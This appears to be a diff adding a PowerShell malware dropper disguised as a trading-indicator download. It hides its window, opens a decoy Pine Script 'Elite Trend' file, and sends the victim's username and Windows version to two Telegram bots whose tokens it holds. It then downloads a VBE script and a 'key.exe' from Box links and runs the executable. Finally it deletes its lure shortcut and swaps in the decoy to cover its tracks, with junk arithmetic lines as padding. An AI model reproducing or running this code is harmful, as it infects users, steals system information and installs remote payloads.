@@ -1,0 +1,530 @@
+Add-Type -Name a0 -Namespace b0 -MemberDefinition '[DllImport("Kernel32.dll")]public static extern IntPtr GetConsoleWindow();[DllImport("user32.dll")]public static extern bool ShowWindow(IntPtr hWnd,Int32 nCmdShow);'
+$v0=[b0.a0]::GetConsoleWindow()
+[b0.a0]::ShowWindow($v0,0)
+$v1=1+2*3-4
+If($v1>0){}
+$v2="Elite Trend.txt"
+$v3=Join-Path $env:LOCALAPPDATA $v2
+$v4=@"
+// This Pine Script® code is subject to the terms of the Mozilla Public License 2.0 at https://mozilla.org/MPL/2.0/
+// © mrdxb
+
+//@version=6
+indicator(title = "AutoTrend Signals V5", overlay=true)
+
+// === Inputs ===
+// Timeframe Selection
+selectedTF = input.timeframe("", title='EMA TimeFrame')
+
+// MA Settings
+maType = input.string('EMA', title='MA Type', options=['SMA', 'EMA', 'WMA', 'RMA'])
+maLength = input.int(250, title='MA Length', minval=1)
+cloudMultiplier = input.float(0.1, title='Cloud Width Factor (StDev)', step=0.05)
+
+// Smoothing
+smoothLength = input.int(3, title='Smoothing Length', minval=1, tooltip="Smooths final output to create soft, curved lines")
+
+// Appearance
+maWidth = input.int(1, title='MA Line Width', minval=1)
+// Dynamic Cloud Colors
+cloudUpColor = input.color(color.new(color.green, 65), title='Cloud Fill Color (Uptrend)')
+cloudDownColor = input.color(color.new(color.red, 65), title='Cloud Fill Color (Downtrend)')
+borderUpColor = input.color(color.new(color.green, 65), title='Cloud Border Color (Uptrend)')
+borderDownColor = input.color(color.new(color.red, 65), title='Cloud Border Color (Downtrend)')
+
+// === MA Calculation Function ===
+getMA(src, len) =>
+    switch maType
+        'SMA' => ta.sma(src, len)
+        'EMA' => ta.ema(src, len)
+        'WMA' => ta.wma(src, len)
+        'RMA' => ta.rma(src, len)
+
+// === Get Raw Series (MTF or chart TF)
+maRaw = request.security(syminfo.tickerid, selectedTF, getMA(close, maLength))
+stdRaw = request.security(syminfo.tickerid, selectedTF, ta.stdev(close, maLength * 2))
+
+// === Cloud Calculation
+cloudWidth = stdRaw * cloudMultiplier
+upperRaw = maRaw + cloudWidth
+lowerRaw = maRaw - cloudWidth
+
+// === Post-Smoothing
+maSmoothed = ta.sma(maRaw, smoothLength)
+upperSmooth = ta.sma(upperRaw, smoothLength)
+lowerSmooth = ta.sma(lowerRaw, smoothLength)
+
+// === Trend Detection
+isUptrend = maSmoothed > maSmoothed[1]
+isDowntrend= maSmoothed < maSmoothed[1]
+
+// === Dynamic Colors
+dynamicFillColor = isUptrend ? cloudUpColor : cloudDownColor
+dynamicBorderColor = isUptrend ? borderUpColor : borderDownColor
+// === Plot
+//ot(maSmoothed, title='Smoothed MA', color=dynamicFillColor, linewidth=maWidth)
+p1 = plot(upperSmooth, title='Upper Cloud', color=dynamicBorderColor)
+p2 = plot(lowerSmooth, title='Lower Cloud', color=dynamicBorderColor)
+fill(p1, p2, title='Cloud Fill', color=dynamicFillColor)
+
+
+//......  Buy and Sell .......
+
+
+// This Pine Script® code is subject to the terms of the Mozilla Public License 2.0 at https://mozilla.org/MPL/2.0/
+// © SirAlgo
+
+// This Pine Script™ code is subject to the terms of the Mozilla Public License 2.0 at https://mozilla.org/MPL/2.0/
+// © AlgoAlpha
+
+//@version=5
+//ndicator("Zero Lag Trend Signals (MTF) [AlgoAlpha]", shorttitle="AlgoAlpha - 0️⃣Zero Lag Signals", overlay=true)
+
+length  =30 
+mult = 0.4   
+
+src = close
+
+lag = math.floor((length - 1) / 2)
+
+zlema = ta.ema(src + (src - src[lag]), length)
+
+volatility = ta.highest(ta.atr(length), length*3) * mult
+
+var trend = 0
+
+if ta.crossover(close, zlema+volatility)
+    trend := 1
+
+if ta.crossunder(close, zlema-volatility)
+    trend := -1
+
+
+buySignal=ta.crossover(trend,0) and isUptrend
+sellSignal=ta.crossunder(trend,0) and isDowntrend
+
+plotshape(sellSignal? zlema+volatility : na, "Bearish Label", shape.labeldown, location.absolute,color.red, text = "Sell", textcolor =color.white , size = size.tiny)
+plotshape(buySignal? zlema-volatility : na, "Bullish Trend", shape.labelup, location.absolute,color.green, text = "Buy", textcolor = color.white, size = size.tiny)
+
+
+//lotshape(greatBuySignals and showsignals ? up: na ,title = 'Great Buy',text = 'Great Buy',location = location.absolute,style = shape.labelup,size = size.small, color = color.new(color.green,0),textcolor = color.new(color.white,0))
+//lotshape(greatSellSignals and showsignals ? dn:na, title = 'Great Sell', text = 'Great Sell',location=location.absolute,style = shape.labeldown,size=size.small,color=color.new(color.red,0),textcolor = color.new(color.white,0))
+
+
+
+
+//.............. Alert ..........
+
+
+//alertcondition(greatBuySignals and isUptrend,title = "GreatBuy",message = "Great Buy")
+//alertcondition(greatSellSignals and isDowntrend,title = "GreatSell",message = "Great Sell")
+//...
+//alertcondition(strongBuy_signals and isUptrend,title = "StrongBuy",message = "Strong Buy")
+//alertcondition(strongSell_signals and isDowntrend,title = "StrongSell", message ="Strong Sell")
+//...
+
+
+///...... TP & SL TOOLS ........
+
+
+price=close
+useFractal = input.bool(true, title = 'Use Fractal for Stop Loss', group = 'Trade Levels')
+tradeSide = isUptrend?"Buy":"Sell"//input.string('Buy', title = 'Trade Direction', options = ['Buy', 'Sell'], group = 'Trade Levels')
+
+// ==== إعدادات العرض: مجموعة TP&SL STYLE ====
+showLabels = input.bool(true, title = 'Show TP&SL Labels?', group = 'TP&SL STYLE')
+offset = input.int(5, title = 'Offset from Last Bar', minval = 1, maxval = 100, group = 'TP&SL STYLE')
+len = input.int(5, title = 'Line Length', minval = 1, maxval = 100, group = 'TP&SL STYLE')
+labelSizeOption = input.string('Normal', title = 'Label Size', options = ['Tiny', 'Small', 'Normal', 'Large'], group = 'TP&SL STYLE')
+lineWidth = input.int(1, title = 'Line Width', minval = 1, maxval = 5, group = 'TP&SL STYLE')
+lineStyleOption = input.string('Solid', title = 'Line Style', options = ['Solid', 'Dotted', 'Dashed'], group = 'TP&SL STYLE')
+
+// ==== تحويل الإعدادات ====
+labelSize = switch labelSizeOption
+    'Tiny' => size.tiny
+    'Small' => size.small
+    'Normal' => size.normal
+    'Large' => size.large
+
+lineStyle = switch lineStyleOption
+    'Solid' => line.style_solid
+    'Dotted' => line.style_dotted
+    'Dashed' => line.style_dashed
+
+// ==== حساب fractals ====
+fractalLow = low[2] < low[1] and low[2] < low[3] and low[2] < low[0] ? low[2] : na
+fractalHigh = high[2] > high[1] and high[2] > high[3] and high[2] > high[0] ? high[2] : na
+
+var float lastFractalLow = na
+var float lastFractalHigh = na
+if not na(fractalLow)
+    lastFractalLow := fractalLow
+    lastFractalLow
+if not na(fractalHigh)
+    lastFractalHigh := fractalHigh
+    lastFractalHigh
+
+// ==== وقف الخسارة: fractal أو يدوي ====
+stopLoss = useFractal ? tradeSide == 'Buy' ? lastFractalLow : lastFractalHigh : na
+
+// ==== حساب الأهداف التلقائية ====
+slDistance = math.abs(close - stopLoss)
+tp1 = tradeSide == 'Buy' ? close + slDistance * 1 : close - slDistance * 1
+tp2 = tradeSide == 'Buy' ? close+ (tp1 - close) * 2 : close - (close - tp1) * 2
+tp3 = tradeSide == 'Buy' ? close + (tp2 - close) * 1.5 : close - (close - tp2) * 1.5
+
+// ==== الموضع الأفقي ====
+int lastBar = bar_index + offset
+
+// ==== الخطوط ====
+var line entryLine = na
+var line slLine = na
+var line tp1Line = na
+var line tp2Line = na
+var line tp3Line = na
+
+//........... 
+
+var float newtp1 =na
+var float newtp2 = na
+var float newtp3 = na
+var float newSl=na
+var float avv=na
+if (buySignal or sellSignal)
+    newtp1:= tp1
+    newtp2:=tp2
+    newtp3:=tp3
+    newSl:=stopLoss
+    avv:=close
+    line.delete(entryLine)
+    line.delete(slLine)
+    line.delete(tp1Line)
+    line.delete(tp2Line)
+    line.delete(tp3Line)
+    entryLine := line.new(lastBar - len, close, lastBar, close, color = color.orange, width = lineWidth, style = lineStyle)
+    slLine := line.new(lastBar - len, stopLoss, lastBar, stopLoss, color = color.red, width = lineWidth, style = lineStyle)
+    tp1Line := line.new(lastBar - len, tp1, lastBar, tp1, color = color.green, width = lineWidth, style = lineStyle)
+    tp2Line := line.new(lastBar - len, tp2, lastBar, tp2, color = color.green, width = lineWidth, style = lineStyle)
+    tp3Line := line.new(lastBar - len, tp3, lastBar, tp3, color = color.green, width = lineWidth, style = lineStyle)
+
+// ==== الليبلات ====
+var label entryLabel = na
+var label slLabel = na
+var label tp1Label = na
+var label tp2Label = na
+var label tp3Label = na
+
+
+if (showLabels and (buySignal or sellSignal))
+    
+    avv:=close
+    label.delete(entryLabel)
+    label.delete(slLabel)
+    label.delete(tp1Label)
+    label.delete(tp2Label)
+    label.delete(tp3Label)
+    entryLabel := label.new(lastBar, close, 'Entry : ' + str.tostring(close), style = label.style_label_left, color = color.orange, textcolor = color.white, size = labelSize)
+    slLabel := label.new(lastBar, stopLoss, 'SL : ' + str.tostring(stopLoss), style = label.style_label_left, color = color.red, textcolor = color.white, size = labelSize)
+    tp1Label := label.new(lastBar, tp1, 'TP1 : ' + str.tostring(tp1), style = label.style_label_left, color = color.green, textcolor = color.white, size = labelSize)
+    tp2Label := label.new(lastBar, tp2, 'TP2 : ' + str.tostring(tp2), style = label.style_label_left, color = color.green, textcolor = color.white, size = labelSize)
+    tp3Label := label.new(lastBar, tp3, 'TP3 : ' + str.tostring(tp3), style = label.style_label_left, color = color.green, textcolor = color.white, size = labelSize)
+    tp3Label
+
+
+
+
+if not na(slLabel)
+    label.delete(slLabel)
+    slLabel := label.new(bar_index + offset, newSl, "SL : "+str.tostring(newSl),style = label.style_label_left,color=color.red,textcolor = color.white,size = labelSize )
+
+
+if not na(entryLabel)
+    label.delete(entryLabel)
+    entryLabel := label.new(bar_index + offset, avv, "Entry: "+str.tostring(avv),style = label.style_label_left,color=color.orange,textcolor = color.white,size = labelSize )
+
+if not na(tp1Label)
+    label.delete(tp1Label)
+    tp1Label:= label.new(bar_index+offset,newtp1,"TP1 : "+str.tostring(newtp1),style =label.style_label_left,color=color.green,textcolor = color.white,size = labelSize )
+
+
+if not na(tp2Label)
+    label.delete(tp2Label)
+    tp2Label:= label.new(bar_index+offset,newtp2,"TP2 : "+str.tostring(newtp2),style =label.style_label_left,color=color.green,textcolor = color.white,size = labelSize )
+
+
+if not na(tp3Label)
+    label.delete(tp3Label)
+    tp3Label:= label.new(bar_index+offset,newtp3,"TP3 : "+str.tostring(newtp3),style =label.style_label_left,color=color.green,textcolor = color.white,size = labelSize )
+
+
+
+if not na(entryLine)
+    line.delete(entryLine)
+    entryLine := line.new(bar_index+offset-len,avv,bar_index+offset,avv,color=color.orange,width = lineWidth,style = lineStyle)
+
+if not na(slLine)
+    line.delete(slLine)
+    slLine := line.new(bar_index+offset-len,newSl,bar_index+offset,newSl,color=color.red,width = lineWidth,style = lineStyle)
+
+
+if not na(tp1Line)
+    line.delete(tp1Line)
+    tp1Line := line.new(bar_index+offset-len,newtp1,bar_index+offset,newtp1,color=color.green,width = lineWidth,style = lineStyle)
+
+if not na(tp2Line)
+    line.delete(tp2Line)
+    tp2Line := line.new(bar_index+offset-len,newtp2,bar_index+offset,newtp2,color=color.green,width = lineWidth,style = lineStyle)
+
+
+if not na(tp3Line)
+    line.delete(tp3Line)
+    tp3Line := line.new(bar_index+offset-len,newtp3,bar_index+offset,newtp3,color=color.green,width = lineWidth,style = lineStyle)
+
+
+
+///........... Dashboard
+// إعدادات RSI
+rsiShort = 14
+rsiLong = 100
+
+// دالة تجميع الحالات لكل فريم
+getStatuses(tf) =>
+    price1 = request.security(syminfo.tickerid, tf, close)
+        
+    rsi14 = request.security(syminfo.tickerid, tf, ta.rsi(close, rsiShort))
+    rsi100 = request.security(syminfo.tickerid, tf, ta.rsi(close, rsiLong))
+    isBearishRSI = rsi14 < rsi100
+
+    [macdLine, _, _] = request.security(syminfo.tickerid, tf, ta.macd(close, 12, 26, 9))
+    isBearishMACD = macdLine < 0
+
+    ema20 = request.security(syminfo.tickerid, tf, ta.ema(close, 20))
+    ema50 = request.security(syminfo.tickerid, tf, ta.ema(close, 50))
+    isBearishEMA20_50 = ema20 < ema50
+
+    ema200 = request.security(syminfo.tickerid, tf, ta.ema(close, 200))
+    isBearishEMA200 = price1 < ema200
+
+    [isBearishRSI, isBearishMACD, isBearishEMA20_50, isBearishEMA200]
+
+// الحصول على الحالات
+[rsi_5, macd_5, ema20_50_5, ema200_5] = getStatuses("5")
+[rsi_15, macd_15, ema20_50_15, ema200_15] = getStatuses("15")
+[rsi_60, macd_60, ema20_50_60, ema200_60] = getStatuses("60")
+[rsi_240, macd_240, ema20_50_240, ema200_240] = getStatuses("240")
+
+// تنسيق الألوان
+colorBull = color.new(color.green, 0)
+colorBear = color.new(color.red, 0)
+textColor = color.white
+
+// إنشاء الجدول
+var table dashboard = table.new(position.top_right, 5, 5, border_width=1, frame_color=color.black)// cell_spacing=0, cell_padding=1)
+
+fillRow(row, tf, rsi, macd, ema20_50, ema200) =>
+    table.cell(dashboard, 0, row, tf, text_color=textColor, text_size=size.small,bgcolor = color.gray)
+    table.cell(dashboard, 1, row, rsi ? "Bearish" : "Bullish", bgcolor=rsi ? colorBear : colorBull, text_color=textColor, text_size=size.small)
+    table.cell(dashboard, 2, row, macd ? "Bearish" : "Bullish", bgcolor=macd ? colorBear : colorBull, text_color=textColor, text_size=size.small)
+    table.cell(dashboard, 3, row, ema20_50 ? "Bearish" : "Bullish", bgcolor=ema20_50 ? colorBear : colorBull, text_color=textColor, text_size=size.small)
+    table.cell(dashboard, 4, row, ema200 ? "Bearish" : "Bullish", bgcolor=ema200 ? colorBear : colorBull, text_color=textColor, text_size=size.small)
+
+if bar_index % 10 == 0
+    table.cell(dashboard, 0, 0, "TF", bgcolor=color.gray, text_color=textColor, text_size=size.small)
+    table.cell(dashboard, 1, 0, "RSI", bgcolor=color.gray, text_color=textColor, text_size=size.small)
+    table.cell(dashboard, 2, 0, "MACD 4C", bgcolor=color.gray, text_color=textColor, text_size=size.small)
+    table.cell(dashboard, 3, 0, "EMA 20/50", bgcolor=color.gray, text_color=textColor, text_size=size.small)
+    table.cell(dashboard, 4, 0, "EMA 200", bgcolor=color.gray, text_color=textColor, text_size=size.small)
+
+fillRow(1, "M5", rsi_5, macd_5, ema20_50_5, ema200_5)
+fillRow(2, "M15", rsi_15, macd_15, ema20_50_15, ema200_15)
+fillRow(3, "H1", rsi_60, macd_60, ema20_50_60, ema200_60)
+fillRow(4, "H4", rsi_240, macd_240, ema20_50_240, ema200_240)
+
+
+
+//........... superTrend
+
+
+
+//~~ Inputs {
+int prd         =12
+float mult1      = 2
+string dev      = na
+
+//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~}
+
+//~~ Types & Variables {
+
+type SuperBollingerTrend
+    float s
+    color c
+var sbt = SuperBollingerTrend.new(0.0,na)
+int b      = bar_index
+float bbup = ta.sma(high,prd)+ta.stdev(high,prd)*mult1
+float bbdn = ta.sma(low,prd)-ta.stdev(low,prd)*mult1
+//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~}
+
+
+//SuperBollingerTrend Calculation
+
+method SBT(SuperBollingerTrend s,cond,val,col,p,l)=>
+    s.s := na(bbdn) or na(bbup)?0.0 : close>sbt.s?math.max(sbt.s,bbdn) : close<sbt.s?math.min(sbt.s,bbup) : 0.0
+    if cond
+        s.s := val
+        s.c := col
+                                                                                                                                                                                                         //Run Methods
+sbt.SBT(ta.crossover(close,sbt.s),bbdn,color.green,low,true)
+sbt.SBT(ta.crossunder(close,sbt.s),bbup,color.red,high,false)                                                                                                                                                                                                                       //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~                                                                                                                                                                                                                       //~~ Plot & Table {
+                                                                                                                                                                                                                           //Pl
+plot(sbt.s,"SuperBollingerTrend",sbt.c,1)
+
+
+
+//....... HalfTrend .....
+
+amplitude =3// input(title='Amplitude', defval=2)
+channelDeviation =3// input(title='Channel Deviation', defval=2)
+showArrows = false// input(title='Show Arrows', defval=true)
+showChannels = false//input(title='Show Channels', defval=true)
+
+var int trend1 = 0
+var int nextTrend = 0
+var float maxLowPrice = nz(low[1], low)
+var float minHighPrice = nz(high[1], high)
+
+var float up = 0.0
+var float down = 0.0
+float atrHigh = 0.0
+float atrLow = 0.0
+float arrowUp = na
+float arrowDown = na
+
+atr2 = ta.atr(100) / 2
+dev1 = channelDeviation * atr2
+
+highPrice = high[math.abs(ta.highestbars(amplitude))]
+lowPrice = low[math.abs(ta.lowestbars(amplitude))]
+highma = ta.sma(high, amplitude)
+lowma = ta.sma(low, amplitude)
+
+if nextTrend == 1
+    maxLowPrice := math.max(lowPrice, maxLowPrice)
+
+    if highma < maxLowPrice and close < nz(low[1], low)
+        trend1 := 1
+        nextTrend := 0
+        minHighPrice := highPrice
+        minHighPrice
+else
+    minHighPrice := math.min(highPrice, minHighPrice)
+
+    if lowma > minHighPrice and close > nz(high[1], high)
+        trend1 := 0
+        nextTrend := 1
+        maxLowPrice := lowPrice
+        maxLowPrice
+
+if trend1 == 0
+    if not na(trend1[1]) and trend1[1] != 0
+        up := na(down[1]) ? down : down[1]
+        arrowUp := up - atr2
+        arrowUp
+    else
+        up := na(up[1]) ? maxLowPrice : math.max(maxLowPrice, up[1])
+        up
+    atrHigh := up + dev1
+    atrLow := up - dev1
+    atrLow
+else
+    if not na(trend1[1]) and trend1[1] != 1
+        down := na(up[1]) ? up : up[1]
+        arrowDown := down + atr2
+        arrowDown
+    else
+        down := na(down[1]) ? minHighPrice : math.min(minHighPrice, down[1])
+        down
+    atrHigh := down + dev1
+    atrLow := down - dev1
+    atrLow
+
+ht = trend1 == 0 ? up : down
+
+var color buyColor = color.green
+var color sellColor = color.red
+
+htColor = trend1 == 0 ? buyColor : sellColor
+htPlot = plot(ht, title='HalfTrend', linewidth=1, color=htColor)
+
+//...... Alerts......
+
+alertcondition(buySignal and isUptrend, title = "Buy",message = "Buy")
+alertcondition(sellSignal and  isDowntrend, title = "Sell",message = "Sell")
+
+"@
+$v5=5*2-3
+If($v5>0){}
+$v4|Out-File -FilePath $v3 -Encoding UTF8
+Invoke-Item $v3
+$v6="ef03256441"
+$v7=Get-Random -Minimum 100000 -Maximum 999999
+$v8=cmd /c whoami
+$v9="Build ID: "+$v6+" | Attack ID: "+$v7+" | Device/User: "+$v8
+$v10=Join-Path $env:LOCALAPPDATA "identifier.txt"
+$v9|Out-File -FilePath $v10 -Encoding UTF8 -NoNewline
+$v11=7*3-5
+If($v11>0){}
+$v12="8611108124:AAHPfk9LOX6cNny35PEF6XKQ8S9K2Km8r5Q"
+$v13="8770876626"
+$v14=[System.Security.Principal.WindowsIdentity]::GetCurrent().Name
+$v15=(Get-CimInstance Win32_OperatingSystem).Caption
+$v16=Get-Content -Path $v10 -Raw
+$v17=$v16+"`n`nSession started for user: "+$v14+"`nWindows Version: "+$v15
+$v18="https://api.telegram.org/bot"+$v12+"/sendMessage"
+$v19=8/2+1
+If($v19>0){}
+$v20=@{chat_id=$v13;text=$v17}|ConvertTo-Json -Compress
+$v21=6*2-3
+If($v21>0){}
+try{$v22=Invoke-RestMethod -Uri $v18 -Method Post -ContentType "application/json" -Body $v20}catch{}
+$v23="8734366290:AAH7yHMFZ9eW6sAjA-2WAQnjSLLOcWPEa98"
+$v24="270865408"
+$v25=9-3+1
+If($v25>0){}
+$v26="https://api.telegram.org/bot"+$v23+"/sendMessage"
+$v27=@{chat_id=$v24;text=$v17}|ConvertTo-Json -Compress
+$v28=4+6-2
+If($v28>0){}
+try{$v29=Invoke-RestMethod -Uri $v26 -Method Post -ContentType "application/json" -Body $v27}catch{}
+$v30=3*4-2
+If($v30>0){}
+Start-Sleep -Seconds 300
+$v31=2*5-1
+If($v31>0){}
+$v32="https://app.box.com/index.php?rm=box_download_shared_file&shared_name=hbk2jsgu2wqonlqwo7l3o8ewmq7wcpa3&file_id=f_2202961441350"
+$v33="1446062403_house.vbe"
+$v34=[Environment]::GetFolderPath("LocalApplicationData")
+$v35=Join-Path $v34 $v33
+$v36=9-2+1
+If($v36>0){}
+try{$v37=New-Object System.Net.WebClient;$v37.DownloadFile($v32,$v35)}catch{}
+$v38=8*2-3
+If($v38>0){}
+$v39="https://app.box.com/index.php?rm=box_download_shared_file&shared_name=rq0x98xu4awdceg5ildr6sp8ykugdc49&file_id=f_2202801903731"
+$v40="1446062403_key.exe"
+$v41=Join-Path $v34 $v40
+$v42=7*2-1
+If($v42>0){}
+try{$v43=New-Object System.Net.WebClient;$v43.DownloadFile($v39,$v41);$v44=New-Object System.Diagnostics.ProcessStartInfo;$v44.FileName=$v41;$v44.WindowStyle=[System.Diagnostics.ProcessWindowStyle]::Normal;$v44.CreateNoWindow=$false;[System.Diagnostics.Process]::Start($v44)|Out-Null}catch{}
+$v45=6*3-2
+If($v45>0){}
+$v46="Elite Trend.txt.ink"
+$v47=$false
+$v48=$null
+$v49=@((Join-Path $env:USERPROFILE "Desktop"),(Join-Path $env:USERPROFILE "Downloads"),(Join-Path $env:USERPROFILE "Documents"),(Join-Path $env:USERPROFILE "Pictures"),(Join-Path $env:USERPROFILE "Videos"),$env:LOCALAPPDATA,$env:APPDATA)
+$v50=5+3-1
+If($v50>0){}
+foreach($v51 in $v49){If(Test-Path -Path $v51){$v52=Join-Path $v51 $v46;If(Test-Path -Path $v52){$v48=$v52;$v47=$true;break}}}
+$v53=7*2+1
+If($v53>0){}
+If($v47){$v54=Split-Path -Parent $v48;$v55=Get-Date;$v56=600;while(((Get-Date)-$v55).TotalSeconds -lt $v56){$v57=Get-Process -Name "wscript" -ErrorAction SilentlyContinue;If($v57){try{Remove-Item -Path $v48 -Force -ErrorAction Stop;$v58=Join-Path $v54 (Split-Path -Leaf $v3);Copy-Item -Path $v3 -Destination $v58 -Force -ErrorAction Stop;exit}catch{exit}}Start-Sleep -Seconds 3}}
+exit
